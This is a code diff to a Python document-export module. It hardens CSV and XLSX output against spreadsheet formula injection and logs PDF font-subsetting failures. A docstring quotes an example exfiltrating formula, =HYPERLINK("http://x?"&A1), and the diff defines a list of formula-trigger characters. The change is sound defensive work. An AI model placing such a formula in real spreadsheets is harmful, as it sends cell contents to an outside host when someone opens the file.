@@ -30,12 +30,20 @@ from __future__ import annotations
 import csv
 import io
 import re
+from collections.abc import Callable
 from dataclasses import dataclass, field
-from typing import Any, Callable
+from typing import Any
 
 __all__ = [
-    "Block", "ExportDoc", "FORMATS", "SPECS", "ExportSpec",
-    "blocks_from_markdown", "table_block", "render", "safe_name",
+    "FORMATS",
+    "SPECS",
+    "Block",
+    "ExportDoc",
+    "ExportSpec",
+    "blocks_from_markdown",
+    "render",
+    "safe_name",
+    "table_block",
 ]
 
 
@@ -231,16 +239,32 @@ def to_csv(doc: ExportDoc) -> bytes:
         for n, b in enumerate(tables):
             if n:
                 w.writerow([])
-            w.writerow(b.columns)
-            w.writerows(b.rows)
+            w.writerow([_csv_safe(c) for c in b.columns])
+            w.writerows([_csv_safe(c) for c in r] for r in b.rows)
     else:
-        w.writerow([doc.title])
+        w.writerow([_csv_safe(doc.title)])
         for b in doc.blocks:
             for line in _flatten(b):
-                w.writerow([line])
+                w.writerow([_csv_safe(line)])
     # BOM：Excel 打开无 BOM 的 UTF-8 csv 会把中文显示成乱码，而"导出的中文是乱码"
     # 是最容易被当成系统坏了的一种失败。
     return b"\xef\xbb\xbf" + buf.getvalue().encode("utf-8")
+
+
+#: csv 里以这些字符开头的格子，Excel/Sheets 打开时会当成公式求值。
+_CSV_TRIGGER = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(v: Any) -> str:
+    """csv 没有 xlsx 那种"这格是文本"的类型位，只能靠前缀。
+
+    加一个单引号 —— 在 csv 这条路上它是**必要**的（xlsx 那边靠 data_type 就够，
+    所以那边反而不该加，加了 Excel 会原样显示出来）。不做这一步的后果：一份客户
+    给的表里一格 ``=HYPERLINK("http://x?"&A1)``，FDE 导成 csv、双击打开，
+    Excel 就把隔壁格子的内容发出去了；而代码还特意加了 BOM 让 Excel 乐意打开它。
+    """
+    s = "" if v is None else str(v)
+    return "'" + s if s[:1] in _CSV_TRIGGER else s
 
 
 def _flatten(b: Block) -> list[str]:
@@ -288,11 +312,7 @@ def to_xlsx(doc: ExportDoc) -> bytes:
         for row in ws.iter_rows(min_row=2):
             for c in row:
                 c.border, c.alignment = box, wrap
-                # openpyxl 看见以 = 开头的字符串就当公式写（data_type='f'），于是
-                # 材料里一格 "=N/A" 会变成 Excel 里的一个错误公式。强制成文本 ——
-                # 比在前面加单引号好，那个引号 Excel 会原样显示出来。
-                if c.data_type == "f":
-                    c.data_type = "s"
+        _detext(ws)
         # 列宽按内容估，但封顶 —— 一条 200 字的澄清问题会把列拉到屏幕外
         for i, name in enumerate(b.columns, start=1):
             width = max([len(str(name))] + [len(str(r[i - 1])) for r in b.rows
@@ -314,10 +334,25 @@ def to_xlsx(doc: ExportDoc) -> bytes:
             ws.append([ln])
         for row in ws.iter_rows(min_col=1, max_col=1):
             row[0].alignment = wrap
+        _detext(ws)
 
     buf = io.BytesIO()
     wb.save(buf)
     return buf.getvalue()
+
+
+def _detext(ws: Any) -> None:
+    """把这一页里所有被当成公式的格子降回文本。
+
+    openpyxl 看到以 ``=`` 开头的字符串就写成公式（``data_type='f'``）。内容是
+    **别人给的**（客户的表、模型抽出来的口径），所以一格 ``=HYPERLINK(...)``
+    会在 FDE 双击打开时被 Excel 求值。以前只扫了数据行，漏掉表头和说明页 ——
+    而表头正是列名，恰恰来自那份外来表格。整页扫，一格不漏。
+    """
+    for row in ws.iter_rows():
+        for c in row:
+            if c.data_type == "f":
+                c.data_type = "s"
 
 
 def _cell(v: Any) -> Any:
@@ -502,8 +537,10 @@ def to_pdf(doc: ExportDoc) -> bytes:
     pdf = pymupdf.open("pdf", buf.getvalue())
     try:
         pdf.subset_fonts()
-    except Exception:            # noqa: BLE001 — 子集化失败只是文件大，不该导不出来
-        pass
+    except Exception as exc:  # noqa: BLE001 — 子集化失败只是文件大，不该导不出来
+        import warnings
+
+        warnings.warn(f"PDF 字体子集化失败，文件会偏大：{exc}", stacklevel=2)
     return pdf.tobytes(deflate=True, garbage=4)
 
 
